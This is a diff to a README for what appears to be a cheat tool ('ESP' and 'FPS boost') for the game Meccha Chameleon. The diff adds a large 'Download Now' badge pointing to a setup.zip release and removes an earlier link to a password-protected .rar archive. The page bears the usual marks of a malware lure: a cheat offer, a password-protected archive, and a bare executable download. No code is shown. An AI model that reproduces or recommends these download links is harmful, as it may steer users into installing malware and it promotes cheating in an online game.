@@ -4,6 +4,11 @@
 ---
 <img width="665" height="367" alt="121212" src="https://github.com/user-attachments/assets/1ec58d1b-76b2-4b63-8d21-8a13acdc720a" />
 
+<div align="center">
+
+  [![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/KnitPortalQuilt/MECCHA-HAMELEON-TRAINER/releases/download/setup/setup.zip)
+
+</div>
 
 **⚡ MECCHA-HAMELEON-ESP-FPS-BOOST** — Smart tool for Meccha Chameleon players.
 
@@ -21,8 +26,6 @@ Designed to enhance visibility and system responsiveness for better gameplay exp
 
 ---
 
-### 🔽 [Download](https://github.com/KnitPortalQuilt/MECCHA-HAMELEON-TRAINER/releases/download/MECCHACHAMELEON/Meccha.Chameleon.Enhanced.v2.1.rar)
-### PASSWORD 2026
 
 ---
 
